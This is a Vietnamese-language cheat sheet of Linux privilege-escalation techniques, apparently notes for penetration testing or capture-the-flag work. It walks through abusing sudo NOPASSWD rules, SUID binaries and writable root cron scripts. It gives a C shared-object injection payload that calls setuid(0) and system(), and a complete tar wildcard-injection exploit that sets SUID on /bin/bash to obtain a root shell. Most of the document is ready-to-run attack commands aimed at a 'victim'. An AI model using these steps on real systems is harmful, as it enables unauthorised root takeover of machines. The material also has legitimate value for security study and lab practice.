# 1. sudo -l

Điều đầu tiên cần làm là check xem user hiện tại có quyền gì không? Được như bên dưới thì ngon:

```console
$ sudo -l
User example may run the following commands on localhost:
   ... NOPASSWD: /bin/bash
   ...
```

Đơn giản là có thể chạy với quyền sudo mà không cần password gì, lúc này chỉ cần `sudo /bin/bash` cái là ngon.
> Lưu ý: phải chạy y sì thằng `NOPASSWD` (`sudo /bin/bash`, chứ không phải `sudo bash` :)))

# 2. SUID

Tìm các file có SUID Bit:

```console
$ find / -perm -u=s -type f 2>/dev/null
```

Sau đó tham khảo cách "mượn quyền" tại trang [này](https://gtfobins.github.io/)

# 3. crontab

List các cronjobs:

```console
$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Example:

```console
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

Dựa vào kết quả trên, check quyền của file được đặt cronjob bằng `ls -la` xem có thể edit được không. Như ở trên có file `/var/www/html/booked/cleanup.py` có vẻ khả quan, nếu có quyền `wr` thì chỉ cần thay thế nội dung là xong.

# 4. Shared object injection.

Nếu gặp 1 process nào đó chạy với quyền root, sử dụng một shared object file (.so) và có quyền ghi trong thư mục chứa .so đó, hoặc là có quyền ghi với chính file .so đó luôn, có thể thực hiện so injection.

```c 
// pwn.c 
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("some_cmd");
}
```

Gửi file đó lên victim, và compile:

```console 
$ gcc -shared -fPIC -nostartfiles -o so_file_name.so pwn.c 
```

Nếu gặp phải lỗi **"gcc: error trying to exec ‘cc1‘: execvp: No such file or directory"** thì có thể làm thế này:

```console 
$ find /usr/ -name "*cc1*" 2>/dev/null
...
...
/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc
...
...

$ export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
```

# 5. Wildcard injection

Với một số tool nén file như `tar`, `zip`, `rync` và `7z`, có options cho phép chạy câu lệnh hệ thống, và đây là điều xảy ra khi thay tên file thành các options đó.

Ví dụ, có một cronjob như sau:

```console 
$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
...
...
*/3 * * * * root /opt/backup.sh
```

Check perms của `/opt/backup.sh`:

```console 
$ ls -l /opt/backup.sh
-rwxr--r-- 1 root root 63 Aug 30 15:49 backup.sh
```

Nội dung của `/opt/backup.sh`:

```console 
$ cat /opt/backup.sh
#!/bin/bash

cd /var/www/html
tar -cf /opt/backup/backup.tgz *
```

Exploit:

```console
$ cd /var/www/html
$ echo -e '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
```

Lúc này trong `/var/www/html` sẽ có 3 file như sau:

```console 
$ ls
...
...
'--checkpoint=1'
'--checkpoint-action=exec=sh shell.sh'
...
...
shell.sh
```

Đợi khoảng 3 phút, ta thấy `bash` đã được set SUID:

```console
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 28 01:40 /bin/bash
```

Đến bước này chỉ cần:
```console
$ /bin/bash -p

bash-5.1# id
uid=1000(user) gid=1003(user) euid=0(root) egid=0(root) groups=0(root),...
```

Ngoài ra còn nhiều trò khác tại [đây](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) và [đây](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

